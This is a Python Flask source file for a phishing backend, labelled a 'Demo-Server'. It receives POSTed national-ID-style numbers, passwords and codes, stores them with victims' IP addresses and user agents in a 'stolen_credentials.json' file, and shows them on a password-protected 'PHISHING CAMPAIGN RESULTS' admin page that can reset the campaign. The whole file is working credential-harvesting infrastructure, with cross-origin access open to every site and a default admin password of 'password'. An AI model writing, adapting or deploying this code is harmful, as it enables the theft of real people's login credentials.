import os
import re
import json
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from dotenv import load_dotenv

# Load .env file (if exists) and add variables to os.environ
load_dotenv()

app = Flask(__name__)
CORS(app)  # Enable CORS from any origin

# --- Configuration --------------------------------------------------------
DATA_FILE = "stolen_credentials.json"
ADMIN_PASSWORD_HASH = "10612ee356fea3757c368f8d7660235acf92176a29ac20fb17f2335584d1cf75"  # "password"
# To generate new hash: hashlib.sha256("your_password".encode()).hexdigest()

# --- Regex for input validation ---------------------------------------------
ID_RE = re.compile(r"^\d{9}$")  # ID = exactly 9 digits
CODE_RE = re.compile(r"^[A-Z]{2}\d{4}$")  # 2 capital letters + 4 digits


# ---------------------------------------------------------------------------

def load_stolen_data():
    """Load stolen credentials from file"""
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []


def save_stolen_data(data):
    """Save stolen credentials to file"""
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except:
        return False


def verify_admin_password(password):
    """Verify admin password using SHA256 hash"""
    if not password:
        return False
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    return password_hash == ADMIN_PASSWORD_HASH


@app.route("/", methods=["GET"])
def home():
    return jsonify({"message": "Demo server is running"}), 200


# Fix for favicon.ico issue
@app.route('/favicon.ico')
def favicon():
    return '', 204  # Return empty response - prevents 404 error


@app.route("/api/credentials", methods=["GET", "POST"])
def receive_credentials():
    """
    POST: Expects JSON with:
          id (9 digits), password (≥6 characters), code (optional – AA1234)
    GET : Returns info message (to avoid 405 error from browser navigation).
    """
    # ――― Handle GET request ―――
    if request.method == "GET":
        return jsonify({
            "message": "Send a POST request with JSON: {id,password,code}"
        }), 200

    # ――― Get data from POST ―――
    data = request.get_json(silent=True)
    if data is None:
        return jsonify(error="Body must be valid JSON"), 400

    id_number = data.get("id", "")
    password = data.get("password", "")
    code_value = data.get("code", "")

    # ――― Detailed validation ―――
    if not ID_RE.fullmatch(id_number):
        return jsonify(error="id must be exactly 9 digits"), 400
    if len(password) < 6:
        return jsonify(error="password must contain at least 6 characters"), 400
    if code_value and not CODE_RE.fullmatch(code_value):
        return jsonify(
            error="code must be 2 capital letters followed by 4 digits"
        ), 400

    # ――― Prepare record for saving ―――
    record = {
        "timestamp": datetime.now().isoformat(),
        "ip_address": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', 'Unknown'),
        "credentials": {
            "id": id_number,
            "password": password,
            "code": code_value or None
        }
    }

    # ――― Save to file ―――
    stolen_data = load_stolen_data()
    stolen_data.append(record)

    if save_stolen_data(stolen_data):
        print(f"[Demo-Server] ✅ Saved to file: {DATA_FILE}")
    else:
        print(f"[Demo-Server] ❌ Failed to save to file!")

    # Print values to console for verification
    print(
        f"[Demo-Server] Received credentials → "
        f"ID: {id_number}, Password: {password}, Code: {code_value or 'None'} "
        f"from {request.remote_addr}"
    )

    return jsonify({"status": "success", "message": "Credentials received"}), 200


@app.route("/admin/view", methods=["GET", "POST"])
def admin_view():
    """
    Protected endpoint to view stolen credentials
    Requires admin password
    """

    if request.method == "GET":
        # Show login form
        login_form = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Access</title>
            <style>
                body { font-family: Arial; margin: 50px; background: #f0f0f0; }
                .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
                button:hover { background: #0056b3; }
                .warning { color: #dc3545; font-size: 12px; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🔒 Admin Access Required</h2>
                <form method="POST">
                    <label>Enter Admin Password:</label>
                    <input type="password" name="password" required>
                    <button type="submit">Access Data</button>
                </form>
                <div class="warning">⚠️ Unauthorized access is prohibited</div>
            </div>
        </body>
        </html>
        """
        return login_form

    # Handle POST request
    password = request.form.get('password', '')

    if not verify_admin_password(password):
        return jsonify({"error": "Invalid password"}), 401

    # Load and return stolen data
    stolen_data = load_stolen_data()

    if not stolen_data:
        return jsonify({"message": "No data collected yet"}), 200

    # Format data for display
    html_response = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stolen Credentials</title>
        <style>
            body { font-family: monospace; margin: 20px; background: #1a1a1a; color: #00ff00; }
            .header { color: #ff6b6b; font-size: 24px; margin-bottom: 20px; }
            .record { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #00ff00; }
            .timestamp { color: #ffd93d; font-weight: bold; }
            .credentials { color: #ff6b6b; margin: 10px 0; }
            .meta { color: #6bcf7f; font-size: 12px; }
            .count { color: #74c0fc; }
        </style>
    </head>
    <body>
        <div class="header">🎯 PHISHING CAMPAIGN RESULTS</div>
        <div class="count">Total Records: """ + str(len(stolen_data)) + """</div>
        <hr style="border-color: #444;">
    """

    for i, record in enumerate(reversed(stolen_data), 1):
        html_response += f"""
        <div class="record">
            <div class="timestamp">📅 {record['timestamp']}</div>
            <div class="credentials">
                🆔 ID: {record['credentials']['id']}<br>
                🔑 Password: {record['credentials']['password']}<br>
                🏷️ Code: {record['credentials']['code'] or 'None'}
            </div>
            <div class="meta">
                🌐 IP: {record['ip_address']} | 
                📱 User-Agent: {record.get('user_agent', 'Unknown')[:50]}...
            </div>
        </div>
        """

    html_response += """
        <hr style="border-color: #444; margin-top: 30px;">
        <div style="text-align: center; margin: 20px 0;">
            <button onclick="window.location.href='/admin/reset'" 
                    style="padding: 10px 20px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px;">
                🗑️ Reset Campaign
            </button>
        </div>
        <div style="color: #666; text-align: center; margin-top: 20px;">
            🔒 This data is confidential and for authorized personnel only
        </div>
    </body>
    </html>
    """

    return html_response


@app.route("/admin/reset", methods=["GET", "POST"])
def admin_reset():
    """
    Reset/clear all stolen data (requires password)
    """
    if request.method == "GET":
        # Show reset confirmation form
        reset_form = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Reset Campaign Data</title>
            <style>
                body { font-family: Arial; margin: 50px; background: #f0f0f0; }
                .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                .btn-danger { width: 100%; padding: 12px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 5px 0; }
                .btn-danger:hover { background: #c82333; }
                .btn-secondary { width: 100%; padding: 12px; background: #6c757d; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 5px 0; }
                .btn-secondary:hover { background: #5a6268; }
                .warning { color: #dc3545; font-size: 14px; margin: 15px 0; padding: 10px; background: #f8d7da; border-radius: 5px; }
                .info { color: #0c5460; font-size: 14px; margin: 15px 0; padding: 10px; background: #d1ecf1; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🗑️ Reset Campaign Data</h2>

                <div class="info">
                    📊 This will permanently delete all collected credentials from both the server and the JSON file.
                </div>

                <div class="warning">
                    ⚠️ WARNING: This action cannot be undone!<br>
                    All stolen credentials will be permanently lost.
                </div>

                <form method="POST">
                    <label>Enter Admin Password to Confirm:</label>
                    <input type="password" name="password" required>
                    <button type="submit" class="btn-danger">🗑️ DELETE ALL DATA</button>
                </form>

                <button onclick="window.location.href='/admin/view'" class="btn-secondary">← Back to Admin Panel</button>
            </div>
        </body>
        </html>
        """
        return reset_form

    # Handle POST request
    password = request.form.get('password', '')

    if not verify_admin_password(password):
        return jsonify({"error": "Invalid password"}), 401

    # Clear all data
    try:
        # Save empty array to file
        save_stolen_data([])

        success_message = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Reset Complete</title>
            <style>
                body { font-family: Arial; margin: 50px; background: #f0f0f0; }
                .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                .success { color: #155724; font-size: 16px; margin: 15px 0; padding: 15px; background: #d4edda; border-radius: 5px; }
                .btn-primary { padding: 12px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
                .btn-primary:hover { background: #0056b3; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>✅ Reset Complete</h2>
                <div class="success">
                    🧹 All campaign data has been successfully deleted!<br><br>
                    📁 JSON file cleared<br>
                    💾 Server memory cleared<br><br>
                    Your campaign is now ready for a fresh start.
                </div>
                <button onclick="window.location.href='/admin/view'" class="btn-primary">Return to Admin Panel</button>
                <button onclick="window.location.href='/'" class="btn-primary">Back to Home</button>
            </div>
        </body>
        </html>
        """

        print(f"[Demo-Server] 🧹 All data cleared by admin")
        return success_message

    except Exception as e:
        print(f"[Demo-Server] ❌ Failed to clear data: {e}")
        return jsonify({"error": "Failed to clear data"}), 500


if __name__ == "__main__":
    # Get PORT value from .env, default to 5000 if not exists
    port = int(os.getenv("SERVER_PORT", 5000))

    # DEBUG mode? (true/false)
    debug_mode = os.getenv("DEBUG", "true").lower() in ("1", "true", "yes")

    # Create data file if doesn't exist
    if not os.path.exists(DATA_FILE):
        save_stolen_data([])
        print(f"[Demo-Server] Created data file: {DATA_FILE}")

    print(f"[Demo-Server] Admin panel: http://localhost:{port}/admin/view")
    print(f"[Demo-Server] Reset campaign: http://localhost:{port}/admin/reset")
    print(f"[Demo-Server] Default admin password: 'password'")

    # Listen on all addresses (0.0.0.0) so other devices on network can access
    app.run(host="0.0.0.0", port=port, debug=debug_mode)